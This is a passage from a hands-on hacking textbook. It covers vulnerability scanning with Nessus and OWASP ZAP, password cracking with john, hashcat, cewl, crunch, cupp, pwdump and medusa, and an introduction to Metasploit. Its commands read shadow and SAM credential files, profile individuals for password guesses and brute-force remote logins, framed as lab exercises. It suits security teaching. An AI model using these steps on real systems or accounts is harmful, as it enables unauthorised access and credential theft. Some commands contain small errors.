106 | P a g e

## Page 244


## Page 245

This will load your scan and present you with a screen like the below. To
the far right, you will see a |> button. When you click on it, your scan will
begin.
When Nessus has completed your vulnerability scan, open the scan and you
will see a graphical
representation of your scan. In my case there are numerous “info”-level
vulnerabilities, two medium-level vulnerabilities, and two critical
vulnerabilities. Although all vulnerabilities are important, we should first
apply ourselves to the critical ones as they can leave our system vulnerable
to dangers such as
ransomware and remote code execution (RCE).
Let’s click on the critical segment of the graph. This opens and displays the
critical vulnerabilities.
107 | P a g e

## Page 246


## Page 247

This now opens a screen with a list of the critical vulnerabilities. Note the
middle vulnerability is designated MS17-010. That is Microsoft’s
designation of the EternalBlue vulnerability developed by the NSA,
released by the ShadowBrokers hacker group in April 2017, and used to
exploit systems around the world by such malware as WannaCry and Petya
ransomware. Our system is vulnerable to this attack, just as the nmap scan
above warned us!

## Page 248

We can dig even deeper and click on the MS17-010 vulnerability and get
even greater detail.
108 | P a g e

## Page 249

Nessus will now ask you if you want to create an Executive Summary or
Custom Report. I selected
Executive Summary and then selected the PDF format in the upper right
corner. Now Nessus will begin to generate a professional looking
“Executive Summary” of your vulnerability scan in a PDF format ready to
deliver your CTO or CISO.
109 | P a g e

## Page 250


## Page 251

Website Vulnerability Scanning with OWASP ZAP
Nessus is a great tool for finding system and application vulnerabilities, but
if we want to test a website and web applications for vulnerabilities, we
probably want to use a tool designed specifically for that purpose. In
Chapter 6, we used the whatsweb tool to fingerprint websites and it
provided us with significant information on the site such as:
1. The nation the site is served from;
2. The CMS;

## Page 252

3. The web server; and
4. The technologies employed to build the site.
At this stage, we want to know more. We want to know what potential
vulnerabilities the website may have that we can exploit. There are a
number of excellent commercial tools for this purpose, but fortunately the
OWASP (Open Web Application Security Project) project has one of the
best and it’s free!
From the Kali GUI, you can go to applications, Web Application Analysis
and then click on OWASP
ZAP or, if you prefer the command line, just enter OWASP ZAP at the
command line.
110 | P a g e

## Page 253


## Page 254

.
kali >owasp-zap
The first time you use OWASP ZAP you will have to read and approve the
End User License Agreement (EULA). Once you do that, OWASP ZAP will
greet you with the following screen. This screen asks
111 | P a g e

## Page 255


## Page 256

whether you want to “persist the ZAP session”. In essence, it’s asking you
whether you want to save the session.
It is best to “persist” the session with name and location, the second radio
button selection. This will save your results into a file at the location of
your choice. I will name mine “First Web Vulnerability Scan”
(I’m creative aren’t I) and save it to my /root folder.
Next, you will be greeted by a screen titled “Manage Add-ons” like below.
112 | P a g e

## Page 257


## Page 258


## Page 259

Click Update All in the lower right corner.
Once it has completed the download and updated of all its add-ons, it will
reply with a window saying it has complete this task. Click OK and close
the Manage Add Ons window. This will leave you with the OWASP ZAP
vulnerability assessment tool ready to “attack” your target website!
113 | P a g e

## Page 260

In this case, we will be using OWASP ZAP to test the vulnerabilities of an
online website designed to be attacked, webscantest.com. Enter the URL of
the website where it indicates “URL to attack.” Then click the Attack
below.
It will now begin its analysis of the website. First it will spider the site and
then begin an active scan looking for vulnerabilities. This can take awhile.
For very large websites, this may takes hours, so sit back and relax.

## Page 261

While it is a scanning, you will note that across the bottom alerts begin to
appear. These are the vulnerabilities that OWASP ZAP is collecting and
categorizing. As you can see below, there are six types of alerts found;
1. Application Error Disclosure
2. X-Frame-Options Header Not Set
3. Cookie No HttpOnly Flag
4. Cross Domain Javascript Source File Inclusion
5. Web Browser XSS Protection Not Enabled
6. X-Content-Type-Options Header Missing
It is beyond the scope of this book to address these vulnerability types, but
you can go to www.hackers-
arise.com/web-app-hacking t o learn more.
114 | P a g e

## Page 262


## Page 263

When you double click on the first alert “Application Error Disclosure,” it
open a windows with more detail like below.
115 | P a g e

## Page 264

You can go through each of the alerts to determine what type of
vulnerability OWASP ZAP has found and some information on how it can
be exploited.
Summary
Vulnerability scanners are excellent tools for the pentester, but may be too
noisy for the attacker, who needs to remain stealthy. They are not perfect,
but they can find many potential vulnerabilities that might be exploitable,
saving the attacker significant amounts of time. Some vulnerability
scanners can generate a large number of false positives that can be
deceptive to the novice pentester/hacker.
Exercises
1. Use the nmap EternalBlue vulnerability scanner against your
Window 7 system.
2. Download and install the Nessus Essentials vulnerability

## Page 265

scanner and run it against your Windows 7 system or any
other system you may have on your network. When it has
completed, generate an Executive Summary in a PDF format.
3. Run the OWASP ZAP website vulnerability scanner against
www. webscantest.com or a 8
ny other web site and note the
results. Note that vulnerability scanning is not illegal, but
might raise suspicions.
116 | P a g e

## Page 266

8
Cracking Passwords
Usernames and passwords are an idea that came out of 1970’s mainframe
architectures.
They are not built for 2016
Alex Stamos
Passwords are still the most common form of
authentication used in our digital world. We use
passwords to log into our computers, our domain, our bank account, our
Facebook account, and maybe even our phone. In recent years, security
administrators have made a big effort to get people to use longer and
more complex passwords. This makes password cracking more time
consuming, but it can still be the hacker’s best entry point to an account

## Page 267

or network.
117 | P a g e
In this chapter we will discuss methods of cracking passwords and some
tools to do so. There is no single tool or technique that will work on every
password, so it’s important to think strategically when trying to crack
passwords.
We can break down password cracking into several categories, but probably
the most important
distinction is offline vs. online . On nearly every modern system and
application, passwords are stored as hashes (see Appendix A on
Cryptography Basics for Hackers). This is one-way encryption. An
algorithm takes the plain-text password and creates a unique indecipherable
cipher (hash) of it and stores it. When you log in again, the system takes the
password you enter, encrypts it again, and checks to see whether that
encrypted password matches the one it has stored. Far and away the most
effective method for cracking passwords is to (1) locate and grab those hash
files, (2) take them offline, and (3) commit the resources to cracking them.
To see what these hashes look like, log into your Kali system as root and go
to the /etc directory and display that file shadow with the cat command.
kali > cd /etc
kali > cat shadow

## Page 268

This file includes all the accounts on your system and their password
hashes. Since I only have one password on the root account, only one hash
appears. The password hash appears after the username
“root:” and before the next colon “ :”. It is this indecipherable set of
characters that represent the password that we need to crack.
On Windows systems, the password hashes for the local user are stored at;
C:\Windows\System32\config\SAM
118 | P a g e

## Page 269


## Page 270

With modern systems, the password cracking process is to (1) generate a
potential password; (2) encrypt it with the same algorithm the system used
to generate the hash; and then (3) compare that hash to the one recovered
from the system. If they match, you have cracked the password! If they do
not, try the next potential password until one matches or you come to the
end of your list.
119 | P a g e

## Page 271

Cracking Passwords
Although many hacker resources talk about the types of password-cracking
approaches, I prefer to think of just two of them. The first approach is to
use a list of potential passwords. These might include: 1. Dictionary;
2. Dictionary with special characters and numbers;
3. List of commonly used passwords;
4. Custom wordlist developed by the hacker.
In any of these cases, the hacker is attempting to automate the guessing of
passwords (I must say that on many occasions, I have been successful
simply manually guessing the user’s password). The password-cracking
tools take the password candidate from the wordlist, encrypt it with the
appropriate encrypting algorithm (hashing) and then compare the hashes. If
they match, then the cleartext password from the list that was entered into
hashing algorithm is THE password.
The other approach is to brute force the password. A brute-force attack
attempts all the possibilities until it finds the right password. In other words,
if the password is eight characters, a brute-force attack would try every
combination of letters, special characters, and numbers until it arrives at the
right password (this would be seventy-five characters per position raised to
the eighth power, or about 1 quadrillion possibilities).This can be very time-
and resource-consuming, but all passwords are susceptible to brute force
attacks. This is not a prudent approach (except in the case of short
passwords) without using exceptional resources such as GPU farm, a
botnet, or a supercomputer.
For the hacker, the most effective approach is to grab those hash files inside
the system or as they travel outside the system (see the 4-way handshake in
Wi-Fi hacking) and take them offline and commit the resources to cracking
them.
Here, we will examine tools and techniques for first, offline password
cracking and then second, online password cracking.

## Page 272

A Word about Wordlists
Both online and offline password cracking require a list of words to try.
These wordlists don’t necessarily include all words. Some may be
combination of characters that are often used as passwords such as qwerty,
asdfghjk, or 123456. Choosing the proper wordlist may become the most
important decision you make in attempting to crack a password.
Kali has a large number of wordlists built into it. You can locate them by
entering;
kali > locate wordlists
120 | P a g e
These wordlists are usually linked to an application and contain words that
are particular to that application. For instance, the wordlist for the web
directory cracking tool, dirb, contains commonly used words for website
directories. Very often, the key to effective password cracking is selecting
the appropriate wordlist.
In addition, there are numerous wordlist that can be found online. At such
places as
www.skullsecurity.org and www.hackers-arise.com/password-lists.

## Page 273

Finally, you might consider creating your own wordlist, one that should be
customized for the task.
Password Cracking Strategy
When attempting to crack passwords, you will be well served to have a
strategy before attempting the password crack, unless you are brute-forcing
(and then, your strategy is patience). I always start with a small list with the
most commonly used passwords. Remember, although there are 7.5 billion
people on this planet and 1.5 billion speak English (although not all
natively), and people tend to think and act similarly. Lazy people (or those
who simply don’t take information security seriously) will use common
words or common keystroke combinations (i.e. qwerty, 123456) and others
will take an additional step and create slightly more complex passwords
including their name, initials, birthdays, anniversary dates, favorite TV
show, children and spouse, among other things.
From the email dumps on the dark web, we can construct lists of the most
commonly used passwords. In 2018, these were:
1. 123456
2. password
3. 123456789
4. 12345678
5. 12345
6. 111111
7. 1234567
8. sunshine
9. qwerty
121 | P a g e

## Page 274

10. iloveyou
11. princess
12. admin
13. welcome
14. 666666
15. abc123
16. football
17. 123123
18. monkey
19. 654321
20. !@#$%^&*
21. charlie
22. aa123456
23. donald
24. password1
25. qwerty123
Yes, believe or not, the most common passwords are “123456” and
“password”!
These passwords comprise about 10 percent of all user accounts! And
“123456” was used by almost 3

## Page 275

percent of accounts! Although my analysis is less than scientific, I estimate
that the top 5,000 passwords are used on nearly one-third of accounts. With
that information, it would be foolish to attempt a wordlist with millions of
passwords and cost you days, weeks, or months of work. Instead, start
strategically by attempting the top 5,000 or so most-common passwords
first and, only if they fail, try using incrementally larger and more complex
wordlists. If you have all the password hashes on, say, a 1000-user domain,
by simply attempting the top 5,000 passwords, you are likely to find over
300 of them. Remember, you only need one password to compromise the
network.
Cracking Passwords with John the Ripper
John the Ripper is one of the oldest continuously maintained password
crackers. Having first appeared on the hacking scene in 1996, Solar
Designer maintains this excellent Unix/Linux password cracker. Here we
will use it to learn password-cracking principles and strategy using this
simple, yet elegant tool.
We can view john’s help file by simply entering the command john in a
terminal.
kali > john
122 | P a g e

## Page 276

Let’s begin this journey into password cracking by cracking the passwords
on our own Kali Linux
system. First, let’s create some new accounts on our system using the Linux
command “useradd.” This simple command requires a username and then
enter the command “passwd” and then the account name.

## Page 277

It will then prompt you twice for the password.
kali > useradd hacker
kali > passwd hacker
Create five new accounts. On the first two accounts, use short dictionary
words. Then, on the next three, use increasingly longer and more complex
passwords (add numbers, special characters, etc.).
Now that we have six user accounts on our Kali (five new and our root
account), let’s try cracking them with John the Ripper.
The first step to cracking these passwords is to extract the /etc/shadow file
(where the hashes reside) and strip out everything but the password hashes.
We can do this with john’s unshadow command. This command requires
that both the /etc/shadow and the /etc/passwd files be in the same directory.
123 | P a g e
Let’s copy both the shadow and passwd files to current working directory
and then apply the

## Page 278

unshadow command to them, then directing (>) the cleaned password
hashes to a file named
“passwordhashes.”
kali > cp /etc/shadow ./
kali > cp /etc/passwd ./
kali > unshadow passwd shadow > passwordhashes
Although john is very powerful tool with many options and features, we can
start the process of password cracking by simply executing the john
command followed by the file of hashes (passwordhashes).
kali > john passwordhashes
John will now analyze what type of hashing (the encryption being used;
there are hundreds of different types of hashing algorithms and John has a
fairly accurate hash auto-detect of the underlying hash algorithm) algorithm
was used and what, if any, salt (a salt is an additional set of characters
added to the passwords to make it more difficult to crack) is being used.
Then it starts to crack the hashes with its built-in, default of list 3,500
common passwords.
Within seconds, it has cracked two of my passwords and continues to work
to crack the others.
John will continue to attempt to crack the other passwords. When it is done
or you terminate its execution (Ctrl+C), you can view the passwords by
entering;
124 | P a g e

## Page 279

kali > john –show passwordhashes
As you can see, john was capable of cracking four of my passwords in just
a few minutes, but failed on one password. This simply means that the
password in question was not on the default list used by john.
Let’s try another wordlist to crack that remaining password. There are
numerous password lists online and in Kali. Some are good and some are
bad. As I explained earlier, it always a good strategy to try the most popular
passwords first. If you go to www.hackers-arise.com/passwords-list , you
will find numerous password lists you can download and use. Here I have
started with the Top 1,000 passwords.
We can utilize those external lists by using the keyword –wordlist followed
by the location of the list (/root/top1000passwords) after the john command.
To enhance our ability to find the password,
we can add the option –rules . Users are often taught to use and substitute
letters, numbers and special characters in their passwords (often referred to
as “munging”). The –rules option will “mangle” our password list based
upon various rules built into john (for a list of rules, go to john’s man page
and search down to the section on rules). This does character substitution
such as converting the word “password” to

## Page 280

“p@$$w0rd.”
Our command now should look like this.
kali > john –wordlist=/root/top1000passwords –rules passwordhashes
Yes! We found the password for the only user (user5) we didn’t find in the
first pass with john. Now that wasn’t very hard, was it?
125 | P a g e
If this strategy had not worked, we could have used increasingly larger
password lists or eventually resorted to brute-forcing the password by
trying all combinations of letters, numbers, and special characters. As I
mentioned earlier, brute-forcing a password can be VERY time and resource
intensive.
Creating a Custom Password List
If we had not been successful with our password lists, we might want to
consider building our own password list. In this section, I’ll show you three
tools for creating a custom password list, ceWL, crunch and cupp.
ceWL
Although human beings tend to create and use similar passwords, many
people use obscure or little-known words from their industry or hobby to
create passwords. In this way, they believe their password is secure because
no one outside their industry or hobby would think of it.
The concept behind cewl is to harvest these specialized words to create
specialized password lists. ceWL
scrapes words from a targeted website and then creates a password list from
those words. In this way, you can create specialized password lists for an
industry or individual.
For instance, let’s assume the target works in the biopharmaceutical
industry. Many of the words they use in their everyday work would be

## Page 281

unfamiliar to the average hacker. As such, they may use them as
passwords, believing that they are very unlikely to be on a password list
used by a hacker, and they are probably right. Words such as
reverseDNAtranscription , polymerasechainreaction , and others are
unlikely to be in any hacker’s password list. At the same time, they ARE
likely to be among the words found on the company or industry website.
ceWL is able to take those specialized words and create a custom wordlist
for password cracking of those in that industry.
Let’s take a look at ceWL for creating a custom password list.
ceWL is built into Kali, so no need to download and install anything.
Simply enter ceWL to get started or even better cewl –h to pull up the help
screen.
kali > cewl -h
126 | P a g e

## Page 282

Although this help screen seems a bit intimidating with all its options, when
we strip out all the options, the basic command is:
kali > cewl –url <the URL you want to scrape>
Running ceWL without any options is likely to generate a wordlist with a
lot of words that do not comply with the target’s password policy. A smarter
and more efficient approach would be to only harvest the words longer than
the typical company password policy, usually eight characters at a
minimum. We can accomplish this by using ceWL’s minimum word length
option or –m followed by 8. In addition, we can determine the depth of the
spidering (how many subdirectories deep to look). This number will depend
upon the site, but I think a depth of four subdirectories is sufficient and

## Page 283

efficient at capturing most of the keywords. Now we can write our cewl
command to do just that to www.hackers-arise.com a nd scrape every word
longer than eight characters from it.
kali >cewl –d 4 –m 8 https://www.hackers-arise.com –w cewlpasswords
127 | P a g e

## Page 284


## Page 285

Note that it’s important to precede the URL of the target website with http
or https. Without this preface, ceWL will be unable to scrape the target
URL. Depending upon the size of the website, this could take several hours.
When cewl has completed its scraping of potential passwords, it will place
all the potential passwords in a file I have named cewlpasswords (you can
name it anything you desire). We can view the contents of this file by using
the cat command
kali > cat cewlpasswords
ceWL was able to find several hundred potential
passwords on www.hackers-arise.com, some very
specialized to our industry such as Metasploit,
exploits, vulnerability, scripting, and others.
To now use that password list in john, we can
enter;
kali > john –
wordlist=/root/cewlpasswords –rules
passwordhashes
john will now use the list of words scraped from
the target’s website (cewlpasswords) and apply rules
to mangle(-rules) them with character substitution,
thereby increasing the chance of cracking the
target’s passwords.

## Page 286

Crunch
Sometimes, to crack a password, we may need to create a specialized list
that meets certain known parameters. For instance, maybe we know that the
passwords all end in four numbers (eg. password1234) or we know the
target’s birthday and suspect they use it in their password. If the target’s
birthday were February 29, they might create a password such as
“password0229”. Crunch is our tool to create such lists!
To get started with crunch, simply enter crunch in your BASH shell.
kali > crunch
128 | P a g e

## Page 287

Although this displays some basic information on crunch, we really need to
view the man page to
understand how to use crunch.
kali > man crunch
Here we see all the key options to make efficient use of crunch. If we scroll
down a bit, we can see the pattern-specifying wildcards to use with the –t
option.
129 | P a g e

## Page 288

Then when we scroll to the bottom of the man page we can see some simple
examples.
Now let’s try using crunch to create wordlists. Remember my example
above about a target that has a password policy of at least eight characters
and at least one number? Let’s create a custom password list that meets
those criteria.
Let’s say we know that the target is a Bob Dylan fan. They might use that
name and then append it with four numbers (maybe their birth date). We
could create such a list in crunch by entering;
kali > crunch 9 9 -t dylan%%%% -o customwordlist.txt

## Page 289

When we hit enter, crunch first calculates how large the file will become
before creating it (those of you who are Mr. Robot fans (www.hackers-
arise.com/mr-robot) will likely recognize that Elliot cracked his therapist’s
password in Season 1 using a similar technique). In this case, crunch
estimates it will be 100,000 bytes. This is crucial information as it is
possible to create files with crunch that are 130 | P a g e
extraordinarily large and will fill your entire hard drive. For instance, if I
wanted to create a wordlist with four letters before and four numbers after
the password and up to thirteen characters, I would enter; kali> crunch 13
13 –t @@@@dylan%%%% -o customwordlist.txt
As you can see above, crunch is about to create 59GB wordlist! That’s a bit
unwieldy. You probably want to change your strategy unless you have
significant patience and/or computing power.
Cupp
Sometimes we may want to create potential password list that is tailored to
the individual target. People often use their names, their children’s names,
their partner’s names, their pet’s names, their favorite musician’s names as
their password often combining them with special characters and numbers
(admit it.

## Page 290

You’ve done it!). We have a special tool that can create tailored password
lists based upon some key info on the target. It’s called cupp or Common
User Password Profiler.
Cupp is not built into Kali, so you will need to download it from
github.com.
kali > git clone https://github.com/Mebus/cupp
Next, we need to change directory to our new cup directory.
kali > cd cupp
To run cupp’s help screen , we simply need to enter;
kali > ./cupp.py
131 | P a g e

## Page 291

As you can see, cupp is a simple tool with just a few options. To start cupp
in interactive mode, enter the command cupp followed by -i;
kali > ./cupp -i
132 | P a g e

## Page 292

When we do so, cupp goes into interactive mode and begins to ask us
questions about the target, such as name, birthday, partner, pet name, child
name, etc. I filled

## Page 293

in the information as Elliot Alderson, the primary character
from the TV show, “Mr. Robot” would when he was
targeting his court-appointed therapist, Krista Gordon.
When cupp has completed its task, it places all the
potential passwords (3,980 in this case) in a file named
Krista.txt. We can view the contents of that file by
entering;
kali > cat krista.txt
133 | P a g e

## Page 294


## Page 295

As you can see above, cupp began by using variations on
her birth date…
And then variations on her last name…

## Page 296

…and then variations on her first name
There is a very good chance that the target’s password is among this custom
made password list.
Hashcat
Combining the outputs from cewl , crunch, and cupp (the three C’s) to
create a custom list is an effective strategy in many cases, but what if none
of these work and you need to brute force the password? This is where pure
speed is critical.
Hashcat is among the fastest and most sophisticated password crackers. In
addition, it enables us to use the GPU on our graphics card which is much
faster than our CPU for password cracking.
134 | P a g e

## Page 297

Hashcat is a very powerful tool with a myriad of features. If you look at its
help screen, it runs on for pages.
kali > hashcat –help
135 | P a g e

## Page 298

In the final help screen, you can see the choice of character sets, the device
type, the workload profiles, and finally, some examples.
To use hashcat to crack passwords, we will need:
1. The type of hash we are cracking;
2. The type of attack;
3. The output file for the cracked passwords;
4. The file containing our hashes;
5. The file containing our wordlist.
To then crack the password hashes from a Windows system, we could
create a hashcat command as

## Page 299

such:
kali > hashcat –m 0 –a o –o passwords hashlist.txt /root/top10000passwords
Where:
hashcat
is the command
-m 0
designates the type of hash we are attempting to crack (MD5 in this case)
-a 0
designates a dictionary attack
-o passwords
is the output file for the passwords
136 | P a g e
hashlist.txt
is the input file of the hashes
/root/top10000passwords is the absolute path and file name of the wordlist
Windows Password Hashes

## Page 300

Earlier with john the ripper, we simply grabbed the passwords from our
Kali system. If we have root access, that’s not a problem. How would we do
the same in Windows?
As I mentioned in the introduction, Windows stores its passwords at;
c:\Windows\System32\config\SAM.
Whenever a process requires the password that process accesses a DLL
(dynamic linked library) that has system administrator privileges and
accesses the protected SAM file. What if we could control that DLL
and get access to the SAM file?
We can. The process is known as DLL injection. We take a new process and
inject it into the process with access to SAM and then pull out the password
hashes for cracking. There is a tool capable of doing this.
It’s called pwdump . You can download pwdump7 at
https://www.openwall.com/passwords/windows-
pwdump. Let’s download a nd install it on our Windows 7 system and see
whether we can extract the password hashes from there.
Move pwdump7 and its associated .dll file to directory you feel comfortable
working from. I put it on my desktop, so c:\users\OTW\Desktop . Now
open a command prompt (run cmd) on your Windows 7
system and run as administrator.
Navigate to the directory with your pwdump7 and simply execute it and
redirect its output to a file such as password hashes;
C:\Users\OTW\Desktop pwdump7.exe > passwordhashes.txt
Now, open that file at the command line entering;
C:\User\OTW\Desktop\pwdump7.exe>type passwordhashes.txt

## Page 301

137 | P a g e
You should see the users and the password hashes.
Next, copy the file passwordhashes.txt to a flash drive.
Then, attach the flash drive to the Kali system and copy the file to the
Desktop of your Kali system. Now we are ready to crack these passwords
with john or hashcat. Let’s do it with john.
kali > john –format=LM --wordlist=/root/top1000passwords –rules
/root/Desktop/passwordhashes.txt
Note that we are using the format=LM . This is informing john that the
password hashes are in the LM
(LanMan, this format was first developed by IBM in the 1980’s) format.
Remote Password Cracking
Online password cracking on remote systems is whole different animal
from offline password cracking.
Although they both share a process of guessing the password or brute
forcing it, on remote systems we likely will encounter lockouts. In other
words, after so many failed attempts, the account will be locked.
This limits how many attempts you can make. On some systems this
lockout may come after just three attempts, on others it may come after
thousands of attempts (in some cases, there are ways to bypass the lockout).
The important point is that when cracking online passwords we often do not
have unlimited attempts like we do with offline cracking.

## Page 302

Another key issue with online password cracking is that the username and
password tests (guesses) must be sent in a format that the application
expects them. Each application uses slightly different formats for their
username and password requests. In some cases, we may need to capture
and analyze that format in order to format our requests properly (see
Chapter 12, Web Hacking).
In this section of Password Cracking, we will be using a lightweight,
command-line password cracker named medusa. Medusa is built into our
Kali, so no need to download or install anything. To view medusa’s help
screen, simply enter;
kali > medusa -h
138 | P a g e

## Page 303

As we can see above, medusa has numerous options, but we can reduce the
medusa syntax to;
medusa -h <host IP> -u <username> -P <password file> -M <module>
The medusa modules enable it to present the username and password in a
format acceptable to the
application. To view the application modules in medusa, simply enter;
kali > medusa -d
139 | P a g e
As you can see, medusa has eighteen application modules.
Let’s try using medusa to crack the root user’s password on our MySQL
database on our Windows 7
system.

## Page 304

To do so, we would create the following command;
kali > medusa –h 192.168.0.114 –u root –P /root/top10000passwords –M
mysql
Where;
-h 192.168.0.114
is the IP address of our Windows 7 system with MySQL
-u root
is the user we want to crack
-P /root/top10000passwords is the path to our password list
-M mysql
is the module we want to use
When we hit enter, medusa begins trying the passwords one-by-one against
the MySQL login. It will continue these attempts until it successfully finds
the correct password or comes to the end of the list. Be patient! Even with
just 10,000 passwords, this process can take hours.
140 | P a g e

## Page 305

Summary
Password cracking can often be the quickest and most effective way to take
control of a target system.
This is particularly true when the target is using a simple password. It’s
important to develop a strategy before embarking on password cracking as
different operating systems and applications require different approaches. If
all strategies fail, then the attacker is left with a brute force attack which can
be very time-and resource-consuming.
If you have physical access to a running system or have already
compromised the system, the
mimikatz tool may be an option (mimikatz was used in the Blackenergy3,
Wannacry and NotPetya
attacks). This tool extracts the passwords from RAM on a running system.
For more on using
mimikatz, go to Chapter 11 on Post –Exploitation , or https://www.hackers-
arise.com/single-
post/2016/09/13/Mr-Robot-Hacks-How-Angela-Stole-Her-Bosss-Password-
Using-mimikatz .
Exercises
1. Create five new accounts of increasing complexity in your Kali Linux,
and then try
cracking them with john the ripper.
2. Create custom password lists with crunch, cewl and cupp for yourself.
3. Extract the local user passwords hashes from your Windows 7 system.
4. Use medusa to crack the password on your MySQL application on your
Windows

## Page 306

7 system.
141 | P a g e
9
Exploitation with Metasploit 5
Every adversary--no matter how strong and powerful--has a weakness.
Find the weakness and exploit it.
Master OTW
Metasploit is the world's leading

## Page 307

exploitation/hacker framework . It is used--to some
extent--by nearly every hacker/pentester. As such, if you want to
enter and prosper in this exciting field, you need to master it.
What is Metasploit?
142 | P a g e
Metasploit is a standardized framework for used primarily in offensive
security or penetration testing (legal hacking to find vulnerabilities before
the bad guys do). Before Metasploit, exploits and shellcode would be
developed by various coders, in various languages, for various operating
systems. The pentester had to rely upon the trustworthiness of the developer
that the code wasn’t laden with malware and learn how the developer
intended the exploit/shellcode/tool to function. With the advent of
Metasploit, the pentester has a standardized framework to work from where
tools work similarly and all are written in the same language, making things
much simpler and easier.
Originally developed by HD Moore as an open-source project, Rapid7
purchased Metasploit (Rapid7 also owns the vulnerability scanner,
Nexpose). Although originally developed as an open-source project, Rapid7
has now developed a Pro version of Metasploit with a few more "bells and
whistles" (bells and whistles can be good and save time and money).
Fortunately, the open-source, community-edition of Metasploit is still
available to the rest of us without the thousands of dollars to spend on the
Pro version (if you are a professional pentester, the efficiency and time
savings accrued by using the Pro version make it a good investment).
Metasploit Interfaces
Metasploit has multiple interfaces including;

## Page 308

(1) msfconsole - an interactive command-line like interface
(2) msfcli - a literal Linux command line interface
(3) Armitage - a GUI-based thi rd party application (4) msfweb - browser
based interface
Undoubtedly, the most common way to use Metasploit is through
Metasploit's interactive
shell, msfconsole . In this chapter on Metasploit, we will be using the
msfconsole.
In recent years, Metasploit has integrated additional tools to make it more
than just an exploitation framework. Tools, such as nmap , Nessus and
Nexpose, are now integrated into Metasploit, so that the entire process from
port scanning, vulnerability scanning, exploitation, and post-exploitation,
can all be done from one single tool. In addition, Metasploit has now
integrated a postgresql (postresql i s a popular enterprise-level, open-source
database management system) database to store the data collected from
your scans and exploits.
Getting Started with Metasploit
Before we start Metasploit, its good idea to start the postgresql database in
the background. This enables Metasploit to store data in the familiar
relational database model. This enables easy and seamless access to your
data. Metasploit will work without postgresql, but this database enables
Metasploit to run faster searches and store the information you collect while
scanning and exploiting.
kali > systemctl start postgesql
143 | P a g e

## Page 309

Now, it’s time to start using Metasploit. You can either start it from the GUI
Applications-
>Exploitation Tools -> msfconsole
Or you can start it by entering msfconsole from the terminal
kali > msfconsole
Within a few seconds, you will be greeted by the familiar--if sometimes
offbeat--Metasploit splash screen (yours may appear different). If you have
been using Metasploit 4, you will immediately notice the welcome speed
improvement of Metasploit 5.
Note the command prompt msf5> (if you are using an older version of
Metasploit, your command
prompt will be msf > without the 5). That indicates that you are now inside
Metasploit’s interactive mode that they call msfconsole.

## Page 310

A word about terminology, before we start. In Metasploit terminology, an
exploit is a module that takes advantage of a system or application
vulnerability. It cracks open a door or window. The exploit then usually
attempts to place a payload (rootkit, listener) on the target system. This
payload can be a simple command shell or the all-powerful Meterpreter .
In other environments these payloads might be termed listeners or rootkits
. To a beginner, exploit and payload modules are the most important, but we
will use auxiliary modules later in this chapter and post modules in Chapter
11 (Post-Exploitation).
Metasploit was designed with “modules.” These modules are seven (7)
types.
144 | P a g e

## Page 311


## Page 312

(1) exploits
(2) payloads
(3) auxiliary
(4) nops
(5) post
(6) encoders
(7) evasion (new in Metasploit 5)
Keywords
From this msfconsole, you can enter system commands (ifconfig, ping,etc.)
as well as Metasploit’s keywords. To view those keywords, enter help at the
msf5> prompt;
msf5> help
145 | P a g e
Although Metasploit is a very powerful exploitation framework, just a few
keywords can get you started hacking.

## Page 313

Let's take a look at some of those keyword commands.
The "use" command loads a module. So, for instance, if I wanted to load an
exploit that took advantage of a specific vulnerability in Adobe Flash, I
might “use”
the exploit/windows/browser/adobe_flash_avm2 module (this is an
exploit that takes advantage of one of the many vulnerabilities in the Adobe
Flash plug-in).
To do load this module, I would enter;
msf > use exploit/windows/browser/adobe_flash_avm2
As you can see above, when Metasploit successfully loads the module, it
responds with the type of module (exploit) and the abbreviated module
name in red .
msf> show
After you load a module, the show command can be very useful to gather
more information on the module. The three "show" commands I use most
often are " show options ," " show payload s," and " show targets ."
Let's look at "show payloads" first.
msf > show payloads
This command, when used after selecting your exploit, will show you all
the payloads that are compatible with the exploit you selected (not all
payloads will work with every exploit. In this case, Metasploit 146 | P a g e

## Page 314

shows you over 160 payloads that will work with this exploit). If you run
this command before selecting an exploit, it will show you ALL payloads, a
VERY long list (over 500).
As you see in the screenshot above, the show payloads command listed all
the payloads that will work with this exploit.
msf > show options
This command is also very useful in running an exploit. It will display all of
the options (variables) that need to set before running the module. These
options include such things as IP addresses, URI path, the port number, etc.
In most exploits, you will see the following options (variables).
RHOSTS - this is the remote host or target IP (RHOST in Metasploit 4)
LHOST - this is the local host or attacker IP
RPORT - this is the remote port or target port
LPORT - this is the local port or attacker port
These can all be set by using the SET command followed by the variable
name (RHOST, for instance) and then the value, such as;

## Page 315

msf5 > SET RHOST 192.168.1.101
A less commonly used command is " show targets ." Each exploit has a list
of the targets it will work against. By using the "show targets" command,
we can get a list of these. In this case, targeting is automatic, but some
exploits have as many as 100 different targets, and success will often
depend upon you selecting the correct one. These targets can be defined by
the target operating system, service pack, language, among other factors.
msf5 > show targets
147 | P a g e

## Page 316

msf5 > info
The info command is simple. When you type it after you have selected a
module, it shows you key information about the module.
If you scroll down a bit, you can see more info including the options that
need to be set, the amount of payload space a description of the module and
references to learn more about the vulnerability it exploits.
I usually run this command after selecting my exploit. It simply helps me
understand the key features of an exploit before using it.
msf5 > set
This command is used to set options within the module you selected. For
instance, if we look above at 148 | P a g e
the show options command, we can see numerous options that must set,
such as, URIPATH , SVRHOST , and SVRPORT . We can set any of
these variables with the set command such as;
msf5 > set SRVPORT 80
This changes the default SVRPORT (server port) from 8080 to 80.
msf5 > unset
This command, as you might expect, unsets the option that was previously
set. Such as;
msf5 > unset SRVPORT
As you can see, we first set the SRVPORT variable to 80 and then unset it.
It then reverted to the default value of 8080 that we can see when we typed
show options again.
msf5 > exploit

## Page 317

Once we have loaded our exploit and set all the necessary options, the final
action is " exploit ." This sends the exploit to the target system and, if
successful, installs the payload.
The exploit starts and is running as background job with a reverse handler
on port 4444. This exploit then started a web server on host 0.0.0.0 on port
80 with a randomized URL (F5pmyl9gCHVGw90). We could have chosen
a specific URL and set it by changing the URIPATH variable with the set
command.
msf5 > back
We can use the back command to take us "back" one step in our process.
So, if you decided that we did not want to use the adobe/flash/avm2 exploit,
we could type "back" and it would remove the loaded exploit.
msf5 > exit
The exit command, as you would expect, exits us from the msfconsole and
back into the BASH
command shell.
Notice that in this case, it stops the webserver that we created in this exploit
and returned us to the Kali command prompt in the BASH shell.
Strategy for Finding the Proper Module
As a newcomer to Metasploit, the "search" command might be the most
useful. When Metasploit was small and new, it was relatively easy to find
the right module you needed. Now, with over 3000 modules, finding just
the right module can be time-consuming and problematic. Rapid7 added the
search function starting with version 4, and it has become a time- and life-
saver. For the novice hacker to be able to use Metasploit effectively,
understanding the search function is crucial.
149 | P a g e

